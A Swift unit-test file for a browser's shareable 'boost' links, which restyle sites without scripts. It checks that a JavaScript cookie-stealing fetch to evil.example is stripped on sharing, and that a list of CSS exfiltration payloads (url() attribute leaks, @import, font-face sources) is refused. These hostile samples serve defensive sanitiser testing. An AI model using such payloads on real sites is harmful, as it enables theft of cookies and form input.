import CraCore
import Foundation
import Testing

/// Shared boosts: the gallery's boost.json, Share Boost…'s crabrowser.app/boost link and the site's
/// cra-boost: Open in Cra button. Look only (no JavaScript, nothing fetched), and version 1 is a
/// promise to every link already sent.
struct SharedBoostTests {
    private var hideShorts: SharedBoost {
        var b = SharedBoost(name: "Hide Shorts", host: "www.YouTube.com", about: "No Shorts shelves.", by: "VictorKildahl")
        b.zapped = ["ytd-reel-shelf-renderer", "a[title=\"Shorts\"]"]
        b.css = ".md\\:hidden { opacity: 0.5 }"
        return b
    }

    @Test func roundTripsThroughBothLinks() throws {
        let boost = hideShorts
        #expect(boost.host == "youtube.com")
        #expect(boost.problems.isEmpty)
        let link = try #require(boost.link)
        #expect(link.hasPrefix("https://crabrowser.app/boost#"))
        #expect(!link.contains("?"))
        #expect(SharedBoost.from(link: link) == boost)
        let install = try #require(boost.installURL)
        #expect(install.hasPrefix("cra-boost:"))
        #expect(SharedBoost.from(link: install) == boost)
        // A browser may write it cra-boost://…
        #expect(SharedBoost.from(link: "cra-boost://" + install.dropFirst("cra-boost:".count)) == boost)
        #expect(SharedBoost.from(link: "https://crabrowser.app/folder#" + (boost.payload ?? "")) == nil)
    }

    @Test func sharesTheLookNeverTheScript() throws {
        var mine = Boost(host: "news.ycombinator.com", name: "Calm HN")
        mine.font = Boost.fonts.firstIndex(of: "Georgia")
        mine.textScale = 1.2
        mine.invert = true
        mine.zapped = [".votearrow"]
        mine.js = "fetch('https://evil.example/?c=' + document.cookie)"
        let shared = SharedBoost(mine)
        #expect(shared.font == "Georgia")
        #expect(shared.contrast == nil && shared.strength == nil)
        let link = try #require(shared.link)
        let back = try #require(SharedBoost.from(link: link)).boost()
        #expect(back.js.isEmpty)
        #expect(back.id != mine.id)
        var expected = mine
        expected.id = back.id
        expected.js = ""
        #expect(back == expected)
        #expect(back.stylesheet == mine.stylesheet)
    }

    /// A link someone hand-made with a js key: it installs without it.
    @Test func ignoresAScriptInTheLink() throws {
        let json = #"{"v":1,"name":"Sneaky","host":"example.com","css":"body{color:red}","js":"alert(1)"}"#
        let boost = try #require(SharedBoost.from(json: Data(json.utf8)))
        #expect(boost.problems.isEmpty)
        #expect(boost.boost().js.isEmpty)
    }

    @Test(arguments: [
        "input[value^=a] { background: url(https://evil.example/a) }",
        "input[value^=a] { background: URL(https://evil.example/a) }",
        "input[value^=a] { background: \\75 rl(https://evil.example/a) }",
        "input[value^=a] { background: \\url(https://evil.example/a) }",
        "body { background: -webkit-image-set(\"https://evil.example/a\" 1x) }",
        "body { background: image(\"https://evil.example/a\") }",
        "@import 'https://evil.example/a.css';",
        "@font-face { font-family: x; src: url(https://evil.example/f.woff) }",
        "a { -moz-binding: x }",
    ])
    func refusesCSSThatFetches(_ css: String) {
        var b = SharedBoost(name: "Bad", host: "example.com")
        b.css = css
        #expect(!b.problems.isEmpty)
        #expect(b.link == nil && b.installURL == nil)
    }

    @Test(arguments: [
        "a { color: red; }\n.md\\:hidden { display: none }",
        "@font-face { font-family: Mine; src: local(\"Georgia\") }",
        "img:not([alt]) { outline: 2px solid red } .x::before { content: \"“\" }",
    ])
    func allowsPlainCSS(_ css: String) {
        var b = SharedBoost(name: "Fine", host: "example.com")
        b.css = css
        #expect(b.problems.isEmpty)
    }

    /// `content: "\201C"` is harmless, but telling it from `\75 rl(` needs a CSS tokenizer, so any
    /// escaped letter or digit is refused (write the character itself).
    @Test func refusesEscapedCodePoints() {
        var b = SharedBoost(name: "Quote", host: "example.com")
        b.css = ".x::before { content: \"\\201C\" }"
        #expect(!b.problems.isEmpty)
    }

    @Test func refusesWhatIsNotASiteOrAName() {
        var b = SharedBoost(name: " ", host: "localhost")
        b.css = "a{color:red}"
        b.by = "not a user"
        b.font = "Comic Sans MS"
        b.contrast = 400
        b.zapped = ["a { } body"]
        let problems = b.problems
        #expect(problems.count == 6)
        #expect(SharedBoost(name: "Nothing", host: "example.com").problems == ["It doesn’t change anything."])
        var newer = hideShorts
        newer.v = 2
        #expect(newer.problems.first == "Made by a newer Cra (format 2).")
    }

    @Test func refusesGarbage() {
        #expect(SharedBoost.from(link: "https://crabrowser.app/boost#") == nil)
        #expect(SharedBoost.from(link: "https://crabrowser.app/boost#!!!") == nil)
        #expect(SharedBoost.from(link: "cra-boost:" + String(repeating: "A", count: 70_000)) == nil)
        #expect(SharedBoost.from(link: "https://example.com/boost#abc") == nil)
    }

    /// Made by this version. If this fails, links people already sent stop installing. The site's
    /// test (cra-website src/lib/boost-link.test.ts) decodes the same string.
    static let versionOneLink = "https://crabrowser.app/boost#LY6xCsMwDER_xWhOTDt0MXQvFLoUusQZHEvFBicOthNwQ_69Cu12vDudbgMzxKWAgkcUTxdTySI7CitlCQ0MlZ2XtyWmuw9oXGBoc2YqR9RaOY9Ik9hEnI31pSpxkhexc8rFfNRWbl8GkjaODCczEsObR_p_Y7iCOjfwMfNMCKqDWrBNRKE9hrxZTkiJEidNV3wJdNXwO9bQQ79_AQ"

    @Test func versionOneStillInstalls() throws {
        let boost = try #require(SharedBoost.from(link: Self.versionOneLink))
        #expect(boost == hideShorts)
        #expect(boost.problems.isEmpty)
    }

    /// Every field set: the site draws the gallery's pictures with its own copy of the stylesheet
    /// (cra-website src/lib/boost-link.ts), and its test expects this same string.
    static let everyField = ##"{"v":1,"name":"All","host":"example.com","hue":0.6,"strength":0.4,"invert":true,"contrast":60,"brightness":45,"saturation":55,"font":"Georgia","textScale":1.15,"textCase":"upper","zapped":[".ad","#promo"],"css":"a { color: red }"}"##

    @Test func stylesheetTheSiteDrawsWith() throws {
        let boost = try #require(SharedBoost.from(json: Data(Self.everyField.utf8)))
        #expect(boost.problems.isEmpty)
        #expect(boost.boost().stylesheet == Self.everyFieldSheet)
    }

    static let everyFieldSheet = """
        html { filter: invert(1) hue-rotate(180deg) sepia(0.4) hue-rotate(178deg) saturate(1.8) contrast(1.2) brightness(0.9) saturate(1.1) !important; }
        img, video, picture, canvas, iframe, svg image { filter: invert(1) hue-rotate(180deg) !important; }
        body, body * { font-family: "Georgia", sans-serif !important; }
        html { zoom: 1.15 !important; }
        body, body * { text-transform: uppercase !important; }
        .ad, #promo { display: none !important; }
        a { color: red }
        """

    /// Every boost in the gallery (boosts/<slug>/boost.json at the repo's root) is one Cra installs.
    @Test func everyGalleryBoostInstalls() throws {
        let root = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("boosts")
        let slugs = try FileManager.default.contentsOfDirectory(atPath: root.path).filter { !$0.hasPrefix(".") && !$0.contains(".") }
        #expect(slugs.count >= 10)
        for slug in slugs {
            #expect(slug.range(of: #"^[a-z0-9]+(-[a-z0-9]+)*$"#, options: .regularExpression) != nil, "\(slug): lowercase words with hyphens")
            let file = root.appendingPathComponent(slug).appendingPathComponent("boost.json")
            guard let data = FileManager.default.contents(atPath: file.path), let boost = SharedBoost.from(json: data) else {
                Issue.record("\(slug)/boost.json doesn’t read as a boost")
                continue
            }
            #expect(boost.problems.isEmpty, "\(slug): \(boost.problems.joined(separator: " "))")
            #expect(boost.about?.isEmpty == false, "\(slug): needs an about line")
            #expect(boost.by != nil, "\(slug): needs by (a GitHub user name)")
            #expect(boost.preview != nil, "\(slug): needs a preview page")
        }
    }
}
